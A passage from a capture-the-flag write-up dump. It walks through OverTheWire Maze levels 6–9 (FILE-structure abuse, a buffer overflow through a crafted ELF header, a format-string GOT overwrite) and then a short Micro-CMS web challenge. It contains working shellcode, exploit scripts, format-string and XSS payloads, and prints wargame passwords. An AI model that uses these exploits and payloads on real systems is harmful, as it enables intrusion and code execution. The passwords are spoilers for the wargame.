= 0x0, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 39 times\u0026gt; }  And indeed, if we continue, we will execute a shell:\ngdb-peda$ continue Continuing. asdf.txtprocess 697 is executing new program: /bin/dash Warning: Cannot insert breakpoint 2. Cannot access memory at address 0x8048606  Now the problem is that we must run the exploit without a debugger. This is problematic since we do not know beforehand the address of the environment variable and the address of the FILE structure on the stack.\nThe address of the environment variable can be obtained using this code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void main(int argc, char** argv) { char *ptr; if (argc \u0026lt; 3) { printf(\"Usage: %s \u0026lt;environment variable\u0026gt; \u0026lt;target program name\u0026gt;\\n\", argv[0]); exit(0); } ptr = getenv(argv[1]); /* get env var location */ ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* adjust for program name */ printf(\"%s will be at %p\\n\", argv[1], ptr); }  Basically, it prints the address where a certain environment variable will be providing the path of the binary to execute as well:\nmaze6@maze:/tmp$ gcc -m32 -o envaddr envaddr.c maze6@maze:/tmp$ export TEST=$(python -c 'print(\"\\x90\" * 20 + \"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze6@maze:/tmp$ ./envaddr TEST /maze/maze6 TEST will be at 0xffffde35  And then, for the issue of the address of the stack, we can make brute force until we get a shell:\n#!/usr/bin/env python3 import os import struct import sys exit_got = 0x080498dc env_addr = 0xffffde35 file_addr = 0xffffd000 + int(sys.argv[1]) length = 256 p32 = lambda h: struct.pack('\u0026lt;I', h) payload = p32(env_addr + 10) payload += b'\\0' * 28 payload += p32(exit_got - 3) payload += p32(exit_got + 5) payload += b'\\0' * 16 payload += p32(0xf7fc5cc0) payload += b'\\0' * 16 payload += p32(0x0804a0a0) payload += b'\\xff' * 8 payload += b'\\0' * 64 payload += p32(0xf7fc3960) payload += b'\\0' * (length - len(payload)) payload += p32(file_addr) os.write(1, bytes(42 ^ b for b in payload))  We will start from 0xffffd000 until 0xffffe000 (which is the available space for the stack) in steps of 4. There will be values where the program stops. This is OK, but we need to cancel the loop and continue to the next iteration:\nmaze6@maze:/tmp$ for i in `seq 0 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 0 ^C maze6@maze:/tmp$ for i in `seq 4 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 4 ^C maze6@maze:/tmp$ for i in `seq 8 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 8 Segmentation fault 12 16 ^C  Finally, we get that 952 is the correct value and we get a shell as maze7:\nmaze6@maze:/tmp$ for i in `seq 840 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 840 Segmentation fault 844 ^C maze6@maze:/tmp$ for i in `seq 848 4 4095`; do echo $i; /maze/maze6 asdf.txt \"$(python3 maze6.py $i)\"; done 848 Fatal error: glibc detected an invalid stdio handle Aborted ... 944 Fatal error: glibc detected an invalid stdio handle Aborted 948 952 asdf.txt$ $ $ whoami maze7  And it works perfectly:\nmaze6@maze:/tmp$ /maze/maze6 asdf.txt \"$(python3 maze6.py 952)\" asdf.txt$ $ whoami maze7 $ cat /etc/maze_pass/maze7 iuvaegoang  Level 7 -\u0026gt; 8 We have another binary that checks the contents of a given file:\nint main(int argc, char **argv) { int __fd; Elf32_Ehdr ehdr; int fd; if (argc \u0026lt; 2) { printf(\"usage: %s file\\n\", *argv); /* WARNING: Subroutine does not return */ exit(1); } __fd = open(argv[1], 0, 0); if (__fd \u0026lt; 0) { printf(\"cannot open file %s\\n\", argv[1]); /* WARNING: Subroutine does not return */ exit(1); } read(__fd, \u0026amp;ehdr, 52); printf(\"Dumping section-headers of program %s\\n\", argv[1]); Print_Shdrs(__fd, ehdr.e_shoff, (uint) ehdr.e_shstrndx, (uint) ehdr.e_shnum, (uint) ehdr.e_shentsize); close(__fd); return 0; }  void Print_Shdrs(int fd, int offset, int shstrndx, int num, size_t size) { void *__buf; void *__buf_00; char sdata[40]; char *strs; Elf32_Shdr *shdr; char *strdata; int i; lseek(fd, offset, 0); __buf = malloc(num * 40); read(fd, __buf, num * 40); lseek(fd, *(__off_t *) ((int) __buf + shstrndx * 40 + 16), 0); __buf_00 = malloc(*(size_t *) ((int) __buf + shstrndx * 40 + 20)); read(fd, __buf_00, *(size_t *) ((int) __buf + shstrndx * 40 + 20)); lseek(fd, offset, 0); puts(\"\\nNo Name\\t\\tAddress\\t\\tSize\"); for (i = 0; i \u0026lt;= num; i++) { read(fd, sdata, size); printf(\"%2d: %-16s\\t0x%08x\\t0x%04x\\n\", i, (int) __buf_00 + sdata._0_4_, sdata._12_4_, sdata._20_4_); } putchar('\\n'); free(__buf_00); free(__buf); return; }  This time, there is a Buffer Overflow vulnerability at read(fd, sdata, size); inside Print_Shdrs, because sdata has 40 bytes assigned as buffer and we can control the size variable, which is the number of bytes that will be inserted into sdata.\nThe variable size comes from ehdr.e_shentsize inside the main function. We can control this field with the given file. Let\u0026rsquo;s try it in GDB:\nmaze7@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ maze7@maze:~$ python3 -c 'print(\"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 4141 4141 4242 4242 4343 4343 4444 4444 AAAABBBBCCCCDDDD 00000010: 4545 4545 4646 4646 4747 4747 4848 4848 EEEEFFFFGGGGHHHH 00000020: 4949 4949 4a4a 4a4a 4b4b 4b4b 4c4c 4c4c IIIIJJJJKKKKLLLL 00000030: 4d4d 4d4d 4e4e 4e4e 4f4f 4f4f 5050 5050 MMMMNNNNOOOOPPPP 00000040: 5151 5151 5252 5252 5353 5353 5454 5454 QQQQRRRRSSSSTTTT 00000050: 5555 5555 5656 5656 5757 5757 5858 5858 UUUUVVVVWWWWXXXX 00000060: 5959 5959 5a5a 5a5a 0a YYYYZZZZ. maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) set pagination off (gdb) disassemble main Dump of assembler code for function main: 0x080486d2 \u0026lt;+0\u0026gt;: push %ebp 0x080486d3 \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080486d5 \u0026lt;+3\u0026gt;: push %ebx 0x080486d6 \u0026lt;+4\u0026gt;: sub $0x38,%esp 0x080486d9 \u0026lt;+7\u0026gt;: cmpl $0x1,0x8(%ebp) 0x080486dd \u0026lt;+11\u0026gt;: jg 0x80486f9 \u0026lt;main+39\u0026gt; ... 0x08048777 \u0026lt;+165\u0026gt;: pushl -0x8(%ebp) 0x0804877a \u0026lt;+168\u0026gt;: call 0x804859b \u0026lt;Print_Shdrs\u0026gt; 0x0804877f \u0026lt;+173\u0026gt;: add $0x14,%esp 0x08048782 \u0026lt;+176\u0026gt;: pushl -0x8(%ebp) 0x08048785 \u0026lt;+179\u0026gt;: call 0x8048480 \u0026lt;close@plt\u0026gt; 0x0804878a \u0026lt;+184\u0026gt;: add $0x4,%esp 0x0804878d \u0026lt;+187\u0026gt;: mov $0x0,%eax 0x08048792 \u0026lt;+192\u0026gt;: mov -0x4(%ebp),%ebx 0x08048795 \u0026lt;+195\u0026gt;: leave 0x08048796 \u0026lt;+196\u0026gt;: ret End of assembler dump.  Let\u0026rsquo;s set a breakpoint before calling Print_Shdrs and look at the parameters:\n(gdb) break *0x0804877a Breakpoint 1 at 0x804877a: file maze7.c, line 83. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt Breakpoint 1, 0x0804877a in main (argc=2, argv=0xffffd784) at maze7.c:83 83 maze7.c: No such file or directory. (gdb) x/16x $esp 0xffffd698: 0x00000003 0x49494949 0x00004d4d 0x00004d4d 0xffffd6a8: 0x00004c4c 0x41414141 0x42424242 0x43434343 0xffffd6b8: 0x44444444 0x45454545 0x46464646 0x47474747 0xffffd6c8: 0x48484848 0x49494949 0x4a4a4a4a 0x4b4b4b4b  We care about the fifth parameter, which is 0x00004c4c this time (where we had LLLL in the file).\nLet\u0026rsquo;s put a breakpoint at the vulnerable read instruction and see if it reaches the breakpoint:\n(gdb) disassemble Print_Shdrs Dump of assembler code for function Print_Shdrs: 0x0804859b \u0026lt;+0\u0026gt;: push %ebp 0x0804859c \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x0804859e \u0026lt;+3\u0026gt;: push %ebx 0x0804859f \u0026lt;+4\u0026gt;: sub $0x38,%esp 0x080485a2 \u0026lt;+7\u0026gt;: push $0x0 0x080485a4 \u0026lt;+9\u0026gt;: pushl 0xc(%ebp) 0x080485a7 \u0026lt;+12\u0026gt;: pushl 0x8(%ebp) 0x080485aa \u0026lt;+15\u0026gt;: call 0x8048410 \u0026lt;lseek@plt\u0026gt; 0x0804864e \u0026lt;+179\u0026gt;: call 0x8048430 \u0026lt;puts@plt\u0026gt; 0x08048653 \u0026lt;+184\u0026gt;: add $0x4,%esp 0x08048656 \u0026lt;+187\u0026gt;: movl $0x0,-0x8(%ebp) 0x0804865d \u0026lt;+194\u0026gt;: jmp 0x80486a4 \u0026lt;Print_Shdrs+265\u0026gt; 0x0804865f \u0026lt;+196\u0026gt;: pushl 0x18(%ebp) 0x08048662 \u0026lt;+199\u0026gt;: lea -0x3c(%ebp),%eax 0x08048665 \u0026lt;+202\u0026gt;: push %eax 0x08048666 \u0026lt;+203\u0026gt;: pushl 0x8(%ebp) 0x08048669 \u0026lt;+206\u0026gt;: call 0x80483e0 \u0026lt;read@plt\u0026gt; 0x0804866e \u0026lt;+211\u0026gt;: add $0xc,%esp 0x08048671 \u0026lt;+214\u0026gt;: lea -0x3c(%ebp),%eax 0x080486c4 \u0026lt;+297\u0026gt;: call 0x8048400 \u0026lt;free@plt\u0026gt; 0x080486c9 \u0026lt;+302\u0026gt;: add $0x4,%esp 0x080486cc \u0026lt;+305\u0026gt;: nop 0x080486cd \u0026lt;+306\u0026gt;: mov -0x4(%ebp),%ebx 0x080486d0 \u0026lt;+309\u0026gt;: leave 0x080486d1 \u0026lt;+310\u0026gt;: ret End of assembler dump. (gdb) break *0x08048669 Breakpoint 2 at 0x8048669: file maze7.c, line 51. (gdb) continue Continuing. No Name Address Size Breakpoint 2, 0x08048669 in Print_Shdrs (fd=3, offset=1229539657, shstrndx=19789, num=19789, size=19532) at maze7.c:51 51 in maze7.c (gdb) continue Continuing. Program received signal SIGSEGV, Segmentation fault. 0xf7e87ce1 in ?? () from /lib32/libc.so.6 (gdb) quit  The program crashes because of the arguments we are passing to Print_Shdrs. Let\u0026rsquo;s fill the file with null bytes until the position where we control size:\nmaze7@maze:~$ python3 -c 'print(\"\\0\" * 44 + \"ABCD\" + \"\\0\" * 40)' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 4142 4344 ............ABCD 00000030: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000040: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000050: 0000 0000 0000 0000 0a ......... maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) break *0x0804877a Breakpoint 1 at 0x804877a: file maze7.c, line 83. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt Breakpoint 1, 0x0804877a in main (argc=2, argv=0xffffd784) at maze7.c:83 83 maze7.c: No such file or directory. (gdb) x/16x $esp 0xffffd698: 0x00000003 0x00000000 0x00000000 0x00000000 0xffffd6a8: 0x00004443 0x00000000 0x00000000 0x00000000 0xffffd6b8: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd6c8: 0x00000000 0x00000000 0x00000000 0x00000000  We know that we can control two bytes (0x00004443, CD), that will be copied to size. Now, let\u0026rsquo;s add something more recognizable after CD:\nmaze7@maze:~$ python3 -c 'print(\"\\0\" * 44 + \"ABCD\" + \"\".join(chr(c) * 4 for c in range(0x41, 0x46)))' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 4142 4344 ............ABCD 00000030: 4141 4141 4242 4242 4343 4343 4444 4444 AAAABBBBCCCCDDDD 00000040: 4545 4545 0a EEEE. maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) break *0x08048669 Breakpoint 1 at 0x8048669: file maze7.c, line 51. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt No Name Address Size Breakpoint 1, 0x08048669 in Print_Shdrs (fd=3, offset=0, shstrndx=16705, num=16705, size=17475) at maze7.c:51 51 maze7.c: No such file or directory. (gdb) c Continuing. 1111638594: (null) 0x00000000 0x0000 Program received signal SIGSEGV, Segmentation fault. 0xf7e84016 in free () from /lib32/libc.so.6 (gdb) info registers eax 0x0 0 ecx 0x41414141 1094795585 edx 0x41414139 1094795577 ebx 0xf7fc5000 -134459392 esp 0xffffd640 0xffffd640 ebp 0xffffd690 0xffffd690 esi 0x2 2 edi 0xf7fc5000 -134459392 eip 0xf7e84016 0xf7e84016 \u0026lt;free+38\u0026gt; eflags 0x10206 [ PF IF RF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 (gdb) quit  Now it crashes, we see that $ecx has 0x41414141 (AAAA) as value. Let\u0026rsquo;s add more null bytes between ABCD and AAAA and see what happens:\nmaze7@maze:~$ python3 -c 'print(\"\\0\" * 44 + \"ABCD\" + \"\\0\" * 4 + \"\".join(chr(c) * 4 for c in range(0x41, 0x45)))' \u0026lt; /tmp/file.txt maze7@maze:~$ xxd /tmp/file.txt 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 4142 4344 ............ABCD 00000030: 0000 0000 4141 4141 4242 4242 4343 4343 ....AAAABBBBCCCC 00000040: 4444 4444 0a DDDD. maze7@maze:~$ gdb -q /maze/maze7 Reading symbols from /maze/maze7...done. (gdb) break *0x08048669 Breakpoint 1 at 0x8048669: file maze7.c, line 51. (gdb) run /tmp/file.txt Starting program: /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt No Name Address Size Breakpoint 1, 0x08048669 in Print_Shdrs (fd=3, offset=0, shstrndx=0, num=0, size=17475) at maze7.c:51 51 maze7.c: No such file or directory. (gdb) c Continuing. 1094795585: (null) 0x00000000 0x0000 Program received signal SIGSEGV, Segmentation fault. 0x44444444 in ?? () (gdb) quit  Alright, now we have control over $eip (0x44444444, DDDD). Now it\u0026rsquo;s time to run shellcode. The simplest way will be to jump to an environment variable loaded on the stack, as in previous levels. We can use the previous program called envaddr to know the address where the variable will be located:\nmaze7@maze:/tmp$ export TEST=$(python3 -c 'import os; os.write(1, b\"\\x90\" * 200 + b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze7@maze:/tmp$ ./envaddr TEST /maze/maze7 TEST will be at 0xffffde0f  Now we create the file (adding some offset to the stack address to jump to the nop instructions) and done:\nmaze7@maze:/tmp$ python3 -c 'import os; os.write(1, b\"\\0\" * 44 + b\"ABCD\" + b\"\\0\" * 16 + b\"\\x20\\xde\\xff\\xff\")' \u0026gt; /tmp/file.txt maze7@maze:/tmp$ /maze/maze7 /tmp/file.txt Dumping section-headers of program /tmp/file.txt No Name Address Size 0: (null) 0x00000000 0x0000 $ whoami maze8 $ cat /etc/maze_pass/maze8 pohninieng  Level 8 -\u0026gt; 9 This time, the binary /maze/maze8 will run a program that listens on a given port (defaults to 1337) and expects a password:\nint main(int argc, char **argv) { int iVar1; int iVar2; __pid_t _Var3; size_t sVar4; ssize_t sVar5; char replybuf[532]; char buf[512]; int sopt; sockaddr_in serv; int bytes; int client_sock; int serv_sock; char *answer; char *question; int port; answer = \"god\"; port._0_2_ = 1337; if (argc == 2) { iVar1 = atoi(argv[1]); port._0_2_ = (uint16_t) iVar1; } iVar1 = socket(2, 1, 6); if (iVar1 == -1) { perror(\"socket()\"); /* WARNING: Subroutine does not return */ exit(1); } setsockopt(iVar1, 1, 2, \u0026amp;sopt, 4); serv.sin_family = 2; serv.sin_port = htons((uint16_t) port); serv.sin_addr = 0; memset(serv.sin_zero, 0, 8); iVar2 = bind(iVar1, (sockaddr *) \u0026amp;serv, 0x10); if (iVar2 == -1) { perror(\"bind()\"); /* WARNING: Subroutine does not return */ exit(1); } iVar2 = listen(iVar1, 5); if (iVar2 == -1) { perror(\"listen()\"); /* WARNING: Subroutine does not return */ exit(1); } alarm(0x4b0); signal(0xe, alrm); signal(0x11, (__sighandler_t) 0x1); while( true ) { client_sock = accept(iVar1, (sockaddr *) 0x0, (socklen_t *) 0x0); _Var3 = fork(); if (_Var3 == 0) break; close(client_sock); } sVar4 = strlen(\"Give the correct password to proceed: \"); send(client_sock, \"Give the correct password to proceed: \", sVar4, 0); sVar5 = recv(client_sock,buf, 0x1ff, 0); buf[sVar5] = '\\0'; iVar1 = strcmp(answer, buf); if (iVar1 == 0) { replybuf._0_4_ = 0x2e727245; replybuf._4_4_ = 0x49202e2e; replybuf._8_4_ = 0x73617720; replybuf._12_4_ = 0x73756a20; replybuf._16_4_ = 0x6f6a2074; replybuf._20_4_ = 0x676e696b; replybuf._24_4_ = 0x202e2e2e; replybuf._28_4_ = 0x2c736579; replybuf._32_4_ = 0x206f6720; replybuf._36_4_ = 0x79617761; replybuf._40_2_ = 0xa2e; replybuf[42] = '\\0'; } else { snprintf(replybuf, 0x200, buf); sVar4 = strlen(replybuf); *(undefined4 *)(replybuf + (sVar4 - 1)) = 0x20736920; *(undefined4 *)(replybuf + sVar4 + 3) = 0x6e6f7277; *(undefined4 *)(replybuf + sVar4 + 7) = 0x5f5e2067; *(undefined2 *)(replybuf + sVar4 + 0xb) = 0xa5e; replybuf[sVar4 + 0xd] = '\\0'; } sVar4 = strlen(replybuf); send(client_sock, replybuf, sVar4, 0); /* WARNING: Subroutine does not return */ _exit(0); }  We can start the server in one shell session and then interact from another one:\nmaze8@maze:~$ /maze/maze8  Despite the password is hard-coded in the binary, the server always says it is wrong:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: god god is wrong ^_^ maze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: asdf asdf is wrong ^_^  The program is calling snprintf using a user-controlled variable (buf) as the format string specifier. Hence, it has a Format String vulnerability. It can be tested as follows:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: %x.%x.%x.%x.%x.%x.%x.%x.%x 3de00e00.30306530.3330332e.33353630.33332e30.33333033.332e6532.33353333.2e303336 is wrong ^_^  This vulnerability allows to read arbitrary values from memory, but also to write arbitrary values.\nFirst of all, we must discover the position in the stack where the actual input string is being stored. This can be done putting som recognizable characters at the beginning and using several %x (format string specifier to print data in hexadecimal digits):\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: AAAA %x.%x.%x.%x.%x.%x.%x AAAA 41414141.34313420.34313431.34332e31.34333133.332e3032.33313334 is wrong ^_^  And we see that the first %x prints 41414141 (which is AAAA in hexadecimal). So, whatever we put on the first 4 bytes will be at position 1 in the stack. We can verify it like this:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: AAAA %1$x AAAA 41414141 is wrong ^_^  And moreover, if we add more data and use %2$x we will get more values:\nmaze8@maze:~$ nc 127.0.0.1 1337 Give the correct password to proceed: AAAABBBB %1$x %2$x AAAABBBB 41414141 42424242 is wrong ^_^  Now it is time to introduce the format string %n. This one allows to write the number of characters printed until the format string %n into the address of the variable that is being pointed.\nFor example, if we entered AAAA %1$n, the program will enter 0x00000005 at address 0x41414141. But this is just an example, the idea now is to overwrite an entry of the Global Offset Table to point to some malicious shellcode.\nAfter snprintf the program calls strlen and _exit. We can overwrite any of them, but I will use _exit. The address of _exit at GOT is the following:\nmaze8@maze:~$ objdump -R /maze/maze8 | grep _exit 08049d18 R_386_JUMP_SLOT _exit@GLIBC_2.0  Now the idea is to put 0x08049d18 (in little-endian format) where we had AAAA on the previous example and write to this address using %n. To test it, let\u0026rsquo;s run the server using GDB. It will be useful to set a breakpoint after snprintf:\nmaze8@maze:~$ gdb -q /maze/maze8 Reading symbols from /maze/maze8...done. (gdb) source /usr/local/peda/peda.py gdb-peda$ disassemble main Dump of assembler code for function main: 0x08048795 \u0026lt;+0\u0026gt;: push ebp 0x08048796 \u0026lt;+1\u0026gt;: mov ebp,esp 0x08048798 \u0026lt;+3\u0026gt;: sub esp,0x440 ... 0x0804899d \u0026lt;+520\u0026gt;: call 0x8048600 \u0026lt;snprintf@plt\u0026gt; 0x080489a2 \u0026lt;+525\u0026gt;: add esp,0xc 0x080489a5 \u0026lt;+528\u0026gt;: lea eax,[ebp-0x440] 0x080489ab \u0026lt;+534\u0026gt;: push eax 0x080489ac \u0026lt;+535\u0026gt;: call 0x80485c0 \u0026lt;strlen@plt\u0026gt; ... 0x080489f9 \u0026lt;+612\u0026gt;: call 0x8048670 \u0026lt;send@plt\u0026gt; 0x080489fe \u0026lt;+617\u0026gt;: add esp,0x10 0x08048a01 \u0026lt;+620\u0026gt;: push 0x0 0x08048a03 \u0026lt;+622\u0026gt;: call 0x8048550 \u0026lt;_exit@plt\u0026gt; 0x08048a08 \u0026lt;+627\u0026gt;: push DWORD PTR [ebp-0x14] 0x08048a0b \u0026lt;+630\u0026gt;: call 0x8048660 \u0026lt;close@plt\u0026gt; 0x08048a10 \u0026lt;+635\u0026gt;: add esp,0x4 0x08048a13 \u0026lt;+638\u0026gt;: jmp 0x80488b8 \u0026lt;main+291\u0026gt; End of assembler dump. gdb-peda$ break *0x080489a2 Breakpoint 1 at 0x80489a2: file maze8.c, line 82.  Because the server forks whenever a connection is received, we need to set GDB to follow the child process:\ngdb-peda$ set follow-fork-mode child gdb-peda$ run 1338 Starting program: /maze/maze8 1338 ^C Program received signal SIGINT, Interrupt. ... Stopped reason: SIGINT 0xf7fd7c99 in __kernel_vsyscall () gdb-peda$ x 0x08049d18 0x8049d18: 0x08048556 gdb-peda$ continue Continuing.  Now we can test the format string explained before:\nmaze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08%1$n' | nc 127.0.0.1 1338 Give the correct password to proceed:  And the server stops at the breakpoint. Now we can examine the address 0x08049d18 (which is the entry for _exit at the GOT):\ngdb-peda$ x 0x08049d18 0x8049d18: 0x00000004  As expected, we have written a value of 0x00000004 because we have printed 4 characters before the format string %n.\nIn order to write a stack address such as an environment variable, we need to enter some value greater than 0xfffdd000 (the beginning of the stack space). Hence, we would need to print a huge amount of characters (which is impossible to handle).\nThe solution is to use format strings like %hn and %hhn, that overwrites 2 bytes and 1 byte each other. For the moment, let\u0026rsquo;s use only %hn:\ngdb-peda$ run 1339 Starting program: /maze/maze8 1339  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08%1$hn' | nc 127.0.0.1 1339 Give the correct password to proceed:  gdb-peda$ x 0x08049d18 0x8049d18: 0x08040004  Alright, we have overwritten the last 2 bytes of the address with 0x0004.\nLet\u0026rsquo;s add an environment variable with shellcode, as in previous levels, and restart GDB:\nmaze8@maze:~$ export TEST=$(python3 -c 'import os; os.write(1, b\"\\x90\" * 200 + b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze8@maze:~$ gdb -q /maze/maze8 Reading symbols from /maze/maze8...done. (gdb) source /usr/local/peda/peda.py gdb-peda$ set follow-fork-mode child gdb-peda$ break *0x080489a2 Breakpoint 1 at 0x80489a2: file maze8.c, line 82.  We have put a lot of nop instructions (\u0026quot;\\x90\u0026quot;) to prevent issues when exploiting the binary without GDB.\nNow we can see the position in the stack where the environment variable TEST is stored:\ngdb-peda$ start ... gdb-peda$ find TEST Searching for 'TEST' in: None ranges Found 2 results, display max 2 items: libc : 0xf7f6fd88 (\"TEST\") [stack] : 0xffffdd6e (\"TEST=\", '\\220' \u0026lt;repeats 195 times\u0026gt;...)  So, we need to write 0xffffdd6e into the entry of _exit in the GOT (0x08049d18). For the moment, let\u0026rsquo;s put 0xdd80 into the last 2 bytes (a little offset has been added to the address of the environment variable). For that, we need to write 0xdd80 = 56704 characters, which can be done with another format string (%c).\nNotice that we have already 4 bytes written (the address), so using a format string like %56700c will be enough:\ngdb-peda$ run 1340 Starting program: /maze/maze8 1340  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08%56700c%1$hn' | nc 127.0.0.1 1340 Give the correct password to proceed:  gdb-peda$ x 0x08049d18 0x8049d18: 0x0804dd80  Nice, now we need to change the first 2 bytes. For that, we need to enter 0xffff into address 0x08049d18 + 2 = 0x08049d1a. However, notice that we have already printed 0xdd80 bytes, so we need 0xffff - 0xdd80 = 8831 additional characters.\nIn order to perform both write processes, we can use the fact that the first 4 bytes of the input string will be set to position 1 in the stack and the next 4 bytes will be at position 2 in the stack. Hence, we will put \u0026quot;\\x18\\x9d\\x04\\x08\\x1a\\x9d\\x04\\x08\u0026quot; at the beginning (8 characters), so that we need to change %56700c to %56696c (not strictly necessary because we have a lot of nop instructions). This will be the final payload:\ngdb-peda$ run 1341 Starting program: /maze/maze8 1341  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08\\x1a\\x9d\\x04\\x08%56696c%1$hn%8831c%2$hn' | nc 127.0.0.1 1341 Give the correct password to proceed:  gdb-peda$ x 0x08049d18 0x8049d18: 0xffffdd80  And we see that the GOT entry of _exit is modified to the desired value. Now if we continue, GDB will try to spawn a shell:\ngdb-peda$ continue Continuing. process 1730 is executing new program: /bin/dash Warning: Cannot insert breakpoint 1. Cannot access memory at address 0x80489a2  Now we are good to go and send our payload without GDB:\nmaze8@maze:~$ /maze/maze8  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08\\x1a\\x9d\\x04\\x08%56696c%1$hn%8831c%2$hn' | nc 127.0.0.1 1337 Give the correct password to proceed is wrong ^_^  maze8@maze:~$ export TEST=$(python3 -c 'import os; os.write(1, b\"\\x90\" * 200 + b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze8@maze:~$ /maze/maze8 $ whoami maze9 $ cat /etc/maze_pass/maze9 jopieyahng  And done. If we enter as maze9, we will see a \u0026ldquo;congratulations\u0026rdquo; message:\nmaze9@maze:~$ ls CONGRATULATIONS  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/overthewire/maze/","section":"ctf","summary":"OverTheWire - Maze","time":50,"title":"Maze"},{"contents":"We have a simple website that allows us to edit and create posts using Markdown:\nLet\u0026rsquo;s click on \u0026ldquo;Testing\u0026rdquo;:\nNow, we can try to edit the current post. A text area is shown in order to write Markdown code:\nMarkdown is a markup language similar to HTML but simpler and easier. Furthermore, Markdown supports the use of HTML tags as well. Hence, let\u0026rsquo;s try a Cross-Site Scripting (XSS) payload like:\n\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;  It seems not to work. In fact, if we show the source code of the updated page, our payload has been replaced:\nSo the payload has been blocked. Let\u0026rsquo;s try with this one:\n\u0026lt;img src=\"x\" onerror=\"alert(123)\"\u0026gt;  Now it seems to work, and the alert is shown:\nIf we inspect the source code again, we obtain a flag:\nLooking at the URL, we can notice that there is a number at the end (/page/1). Let\u0026rsquo;s try putting other numbers: for /page/2 we have the \u0026ldquo;Markdown test\u0026rdquo;, for /page/3 we get a 404 Not Found error. However, for /page/4 we get 403 Forbidden:\nTrying more page numbers will only give 404 Not Found errors.\nLet\u0026rsquo;s mess around with \u0026ldquo;Markdown test\u0026rdquo;:\nThere is nothing more to do on this post. However, we can see that the URL has changed: now it is /page/edit/2. Let\u0026rsquo;s try to view /page/edit/4, the one that gave 403 Forbidden error:\nAnd we have the second flag, exploiting an Insecure Direct Object Reference (IDOR) vulnerability.\nLet\u0026rsquo;s continue creating a new post:\nI decided to put New1 as title and Test1 as content. After that I created another post using New2 and Test2. Now, the main page looks like this:\nLet\u0026rsquo;s try the \u0026lt;img\u0026gt; XSS payload on the title of one of the posts. We do not see the HTML interpreted here:\nBut if we go to the main page we get another flag:\nAnd finally, we can guess that the web application is using a database to store the posts. Therefore, to show them, the server is performing a query on the database to obtain the actual posts. Hence, we can try som SQL injection payload.\nFor instance, we can add a single quote to break the SQL syntax:\nAnd we have the fourth and last flag.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/hacker101ctf/micro-cms-v1/","section":"ctf","summary":"Basic web pentesting. XSS, IDOR, 